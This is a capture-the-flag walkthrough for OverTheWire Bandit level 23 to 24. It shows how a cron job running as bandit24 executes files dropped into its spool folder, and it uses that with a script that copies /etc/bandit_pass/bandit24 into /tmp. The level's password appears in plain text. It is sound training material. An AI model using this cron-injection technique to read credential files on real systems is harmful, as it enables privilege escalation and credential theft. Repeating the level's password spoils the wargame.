# Bandit Level 23 → Level 24

##  Level Goal

A cron job runs automatically as:

```text
bandit24
```

The objective:

- Understand how the cron job works
- Make Bandit24 execute our code
- Use that execution to retrieve the Bandit24 password

---

##  Step 1: Login

Connect using Bandit23 credentials:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

Login successful.

---

##  Step 2: Investigate Cron Jobs

Move into cron configuration directory:

```bash
cd /etc/cron.d/
```

List contents:

```bash
ls -la
```

Interesting file:

```text
cronjob_bandit24
```

Read it:

```bash
cat cronjob_bandit24
```

Output:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Observation:

```text
bandit24
```

runs:

```text
/usr/bin/cronjob_bandit24.sh
```

every minute.

---

##  Step 3: Read the Script

Open it:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Output:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit

echo "Executing and deleting all scripts in /var/spool/$myname/foo:"

for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        owner="$(stat --format "%U" "./$i")"

        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi

        rm -rf "./$i"
    fi
done
```

Understanding:

The script:

1. Goes to:

```text
/var/spool/bandit24/foo
```

2. Looks for files owned by:

```text
bandit23
```

3. Executes them

4. Deletes them afterwards

That means:

> We can place our own script there.

Bandit24 will execute it.

---

##  Step 4: Create Working Directory

Create temporary workspace:

```bash
mkdir /tmp/rad
cd /tmp/rad
```

Create payload script:

```bash
nano script.sh
```

Contents:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/rad/password
```

Save file.

---

##  Step 5: Prepare Script

Create output file:

```bash
touch password
```

Make script executable:

```bash
chmod +x /tmp/rad/script.sh
```

Copy script into execution folder:

```bash
cp /tmp/rad/script.sh /var/spool/bandit24/foo/
```

Now wait.

Cron runs every minute.

Bandit24 executes our script automatically.

---

##  Step 6: Retrieve Password

Check output:

```bash
cat /tmp/rad/password
```

Output:

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

Success.

Bandit24 executed our script.

Our script copied Bandit24 password into our writable directory.

---

##  Final Answer

Password for **Bandit Level 24**:

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

##  Key Takeaways

- Cron automation can become an attack surface.
- Always inspect ownership checks carefully.
- Temporary directories (`/tmp`) are useful for writable workspaces.
- File permissions and execution context matter heavily in Linux.

Commands used:

Make executable:

```bash
chmod +x script.sh
```

Copy file:

```bash
cp source destination
```

Read password:

```bash
cat file
```

---
